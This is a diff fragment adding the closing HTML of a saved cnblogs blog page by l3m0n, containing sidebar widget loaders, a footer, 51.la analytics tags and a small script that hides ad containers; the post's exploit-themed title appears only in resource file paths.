+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
